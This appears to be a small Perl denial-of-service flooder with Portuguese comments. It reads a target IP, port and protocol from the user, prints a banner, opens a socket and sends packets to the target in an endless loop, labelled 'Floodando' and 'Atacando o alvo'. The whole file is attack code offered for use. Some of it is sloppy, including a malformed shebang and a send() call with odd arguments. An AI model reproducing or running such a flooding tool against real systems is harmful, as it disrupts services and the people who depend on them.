#!usr/bin/perl
use utf8;
use IO::Socket;
use warnings;

sub apagar { #Apagar terminal
  system("cls || clear")
}

sub linhas {
  print "______________________________________ \n"
}

my $logo = 'logo.txt'; #Variável que recebe um arquivo
sub intro { #Introdução
  apagar;
  open(my $arq, '<:encoding(UTF-8)', $logo);
  
  while (my $row = <$arq>) {
    chomp $row; print "$row\n"
  }
}

my $buff = 'buff.txt'; #Variável que recebe um arquivo
sub buff { #Introdução
  apagar;
  open(my $arq, '<:encoding(UTF-8)', $buff);
  
  print "[*] $ip:$port > $protocol \n";
  linhas;
  while (my $row = <$arq>) {
    chomp $row; print "$row\n";
  }
}

##
intro;

linhas;
print "Digite o IP >> "; #Set Ip
chop ($ip = <stdin>);
linhas;
print "Digite a Porta >> "; #Set Port
chop ($port = <stdin>);
linhas;
print "Digite o Protocolo [TCP ou UDP] >> ";
chop ($protocol = <stdin>);

buff;
sleep 1;

{
  $sock = IO::Socket::INET -> new (
    PeerAddr => $ip,
    PeerPort => $port,
    Proto => "$protocol") || die "\n Go!";
}

packets:
  while (1) {
    $size = rand() * 9284852 * 84719569;
    print " Pacotes enviados: $size\n";
    send($sock, 999999999999999999999, $size);
    
    packets2:
      $size = rand() * 9284852 * 84719569 * 50;
      print("Floodando ");
      send($sock, 999999999999999999999, $size);
      
      packet3:
        $size = rand() * 9284852 * 84719569 * 29383728;
        print ">>$ip:$port~$protocol<<";
        send($sock, $size, $size); #Atacando o alvo
  }